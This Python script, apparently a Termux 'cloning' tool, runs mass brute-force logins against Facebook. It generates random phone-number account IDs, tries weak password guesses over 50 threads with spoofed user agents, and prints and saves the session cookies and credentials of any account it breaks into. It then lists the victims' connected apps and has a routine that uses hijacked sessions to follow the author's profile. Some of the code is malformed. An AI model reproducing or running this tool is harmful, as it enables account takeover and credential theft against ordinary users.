# Facebook: Farhad lodin
# Github: BCC Villian
# youtube: BCC teach
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[😈] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[😈] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100087390175288&mibextid=ZbWKwL', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=100087390175288&mibextid=ZbWKwL')
logo =("""\033[0;92m
__________
                      .~#########%%;~.
                     /############%%;`\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@   AYAZ AMIRI      @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                    ‌    AYAZ AMIRI
\033[1;94mᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚓᚔᚔᚔᚔᚔᚔᚔᚔᚔᚔ                                                  
\033[1;91m  ᏔᎬᏞᏟϴᎷᎬ Ͳϴ ᎪᎽᎪᏃ ᎪᎷᏆᎡᏆ ᎻᎪᏟᏦᏆΝᏀ ͲϴϴᏞ
\033[0;95m═══════════════════════════════════════════════════
\033[0;32m⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸☛ᎪᎽᎪᏃ ᎪᎷᏆᎡᏆ☚⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸
\033[0;90m [!]\033[0;31mͲϴϴᏞ ϴᏔΝᎬᎡ:➣\033[0;32mᎪᎽᎪᏃ ᎪᎷᏆᎡᏆ [ᏴᏟᏟ ᏟᎽᏴᎬᎡᎽ] 
\033[0;90m [!]\033[0;31mᏀᏆͲᎻႮᏴ:➣\033[0;32m git clone https://github.com/Ayazamiri2020/Hacker.git
\033[0;90m [!]\033[0;31mҒᎡᏆᎬΝᎠ:➣\033[0;32mᎡᎪᎽᎬᎬՏ ҒᎪᎡᎻᎪᎠ [ᏴᏴᏟ  ᏟᎽᏴᎬᎡᎽ]
\033[0;90m [!]\033[0;31mҒᎡᏆᎬΝᎠ:➣\033[0;32m ᏴᏟᏟᏙᏆᏞᏞᏆᎪΝ [ᏴᏟᏟ ᏟᎽᏴᎬᎡ]
\033[0;90m [!]\033[0;31mͲᎬᏞᎬᏀᎡᎪᎷ:➣\033[0;32mᏴᏞᎪΝᏦ ᏟᎽᏴᎬᎡᎽ ᏟᎪᏞᏆᏢᎻᎪͲᎬ
\033[0;90m [!]\033[0;31mᎽϴႮͲႮᏴᎬ:➢\033[0;32m ᏴᏞᎪΝᏦ ᏴᏟᏟ ᏀᎡϴႮᏢ
\033[0;32m⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸☛ᎪᎽᎪᏃ ᎪᎷᏆᎡᏆ☚⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸⫷⫸
\033[0;95m═══════════════════════════════════════════════════
    """) 
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
    print(" ══════════════════════════════════════════")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    rk4 = '017'
    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m 𝐓𝐀𝐓𝐀𝐋 𝐈𝐃𝐙 : \033[0;93m𝟏𝟎𝟎𝟎𝟎, \x1b[38;5;208m𝟐𝟎𝟎𝟎𝟎, \033[0;92m𝟓𝟎𝟎𝟎𝟎 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92m𝐏𝐔𝐓 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐋𝐈𝐌𝐈𝐓᳀:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        jalan(f'[{xr}⚡{x}]\x1b[38;5;208m 𝐘𝐎𝐔𝐑 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃𝐙: {xr}'+tl)
        jalan(f'{x}[{xr}⚡{x}]\033[0;92m 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓 𝐘𝐎𝐔𝐑 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 𝐇𝐀𝐒  𝐁𝐄𝐄𝐍 𝐒𝐓𝐀𝐑𝐓𝐄𝐃')
        jalan(f'\033[0;97m[{xr}⚡{x}] \x1b[38;5;208m𝐓𝐔𝐑𝐍 𝐎𝐍 𝐅𝐋𝐈𝐆𝐇𝐓 𝐌𝐎𝐃𝐄  𝐅𝐎𝐑 𝐒𝐏𝐄𝐄𝐃')
        jalan(f'\033[0;97m[{xr}⚡{x}] \033[0;95m 𝐄𝐍𝐉𝐎𝐘 𝐅𝐑𝐎𝐌 ᎪᎽᎪᏃ ᎪᎷᏆᎡᏆ 𝐓𝐎𝐎𝐋')
        jalan('\033[1;97m▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=zwaiY8oIpRJmusfwcUYR3gcl; sb=zwaiY5XKI6dYvdiAT8MfIAzF; wd=979x1831; dpr=2.34375; fr=0FGFgDcD2x3MSPEbJ..BjogbP.Fh.AAA.0.0.Bjt7jq.AWXveghp-AI',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[ᎪᎽᎪᏃ-𝐎𝐊😈] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎😈]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ᎪᎽᎪᏃ.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[MKR-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/ᎪᎷᏆᎡᏆ-𝐂𝐏.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}ᎪᎷᏆᎡᏆ{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

xxr()
